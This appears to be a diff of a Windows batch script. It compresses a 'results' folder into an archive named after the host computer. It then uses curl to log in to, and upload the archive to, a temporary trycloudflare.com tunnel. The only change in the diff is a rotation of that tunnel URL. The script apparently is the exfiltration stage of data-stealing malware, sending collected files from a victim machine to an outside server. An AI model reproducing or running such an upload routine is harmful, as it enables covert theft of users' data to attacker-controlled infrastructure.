@@ -5,9 +5,9 @@ cd /d "%~dp0"
 powershell -Command "Compress-Archive -Path 'results' -DestinationPath 'result_%COMPUTERNAME%.zip' -Force"
 
 
-curl -c cookies.txt -d "name=alex" -d "pass=123" https://legacy-committee-geo-waiting.trycloudflare.com/Login/login.php
+curl -c cookies.txt -d "name=alex" -d "pass=123" https://brick-interracial-giants-poker.trycloudflare.com/Login/login.php
 
 
-curl -b cookies.txt -F "submit=1" -F "file[]=@result_%COMPUTERNAME%.zip" https://legacy-committee-geo-waiting.trycloudflare.com/Login/upload.php
+curl -b cookies.txt -F "submit=1" -F "file[]=@result_%COMPUTERNAME%.zip" https://brick-interracial-giants-poker.trycloudflare.com/Login/upload.php
 
 
